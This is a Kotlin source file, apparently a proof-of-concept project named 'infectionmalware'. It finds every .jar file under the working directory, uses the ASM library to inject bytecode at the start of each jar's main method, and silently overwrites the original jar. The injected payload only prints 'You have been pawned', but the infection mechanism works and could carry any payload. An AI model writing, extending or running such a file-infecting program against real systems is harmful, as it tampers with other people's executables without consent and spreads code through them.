package me.ciruu.infectionmalware

import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.Opcodes
import org.objectweb.asm.tree.*
import java.io.File
import java.util.jar.JarInputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream

fun main() {
    // Get all jar files into a list
    val files = findFiles()

    // Modify every file in the file list
    files.forEach{ file -> modifyFile(file) }
}

/**
 * @return all jar files in the current working directory
 */
fun findFiles(): List<File> {
    // Get current directory
    val path = File(System.getProperty("user.dir"))

    // Add all jar files excluding this one to a list
    return path.walk().filter {
        !it.name.startsWith("tmp") && it.name.endsWith(".jar") && !it.name.startsWith("gradle-wrapper")
    }.toList()
}

/**
 * Modifies a file's main method to generate malicious code
 */
fun modifyFile(file: File) {
    println("Modifying ${file.absolutePath}")

    val mainClassName = getNameFromManifest(file)
    println("Found main in $mainClassName")

    // Read input file
    val zip = ZipFile(file)
    val entries = zip.entries().toList()

    // Write to temp file
    val tmpFile = File.createTempFile("tmp", ".jar", file.parentFile)
    val stream = ZipOutputStream(tmpFile.outputStream())

    entries.forEach { zipEntry ->
        val inputStream = zip.getInputStream(zipEntry)

        if (zipEntry.name == mainClassName) {
            println("Modifying entry ${zipEntry.name}")
            val node = ClassNode()

            // From bytes to class node that can be modified
            val oldBytes = inputStream.readBytes()
            val reader = ClassReader(oldBytes)
            reader.accept(node, 0)

            // Modify file
            modifyClassFile(node)

            // Convert back to bytes
            val writer = ClassWriter(ClassWriter.COMPUTE_FRAMES or ClassWriter.COMPUTE_MAXS)
            node.accept(writer)
            val newBytes = writer.toByteArray()

            // Write bytes to the jar entry
            val clone = ZipEntry(zipEntry.name)
            stream.putNextEntry(clone)
            stream.write(newBytes)
        } else {
            // Keep original file
            stream.putNextEntry(zipEntry)
            inputStream.copyTo(stream)
        }

        inputStream.close()
        stream.closeEntry()
    }

    // Close streams to flush content to disk
    zip.close()
    stream.close()

    // Replace original file with modified file
    tmpFile.copyTo(file, overwrite = true)
    tmpFile.delete()
}

/**
 * @return the main's class name of the file
 */
fun getNameFromManifest(entry: File): String {
    val jarStream = JarInputStream(entry.inputStream())
    val attributes = jarStream.manifest.mainAttributes.getValue("Main-Class")
    val javaName = attributes.toString()
    jarStream.close()
    // Path to the entry in the jar file
    return javaName.replace(".", "/") + ".class"
}

/**
 * Modify a class node by injecting code into the main method
 */
fun modifyClassFile(node: ClassNode) {
    // Search for the main method in the main class
    val mainMethod = node.methods.find {
        it.name == "main" && it.desc == "([Ljava/lang/String;)V"
    }

    // Not found?
    if (mainMethod == null) error("Main method not found")

    println("Modifying method ${mainMethod.name}")

    // Code:
    // System.out.println("You have been pawned");
    // ASM:
    val patch = InsnList()
    patch.add(FieldInsnNode(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;"))
    patch.add(LdcInsnNode("You have been pawned"))
    patch.add(MethodInsnNode(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V"))

    // Patch the main method
    val firstLine = mainMethod.instructions.first
    // Add the code at the beginning of the method
    mainMethod.instructions.insert(firstLine, patch)
}

/**
 * Decompress a file into a specific folder
 * Used only for testing
 */

/*
fun decompress(file: File, folder: File) {
    val zip = ZipFile(file)
    zip.entries().toList().forEach { e ->
        if (!e.isDirectory) {
            val f = File(folder, e.name)
            f.parentFile.mkdirs()
            f.writeBytes(zip.getInputStream(e).readBytes())
        }
    }
}
*/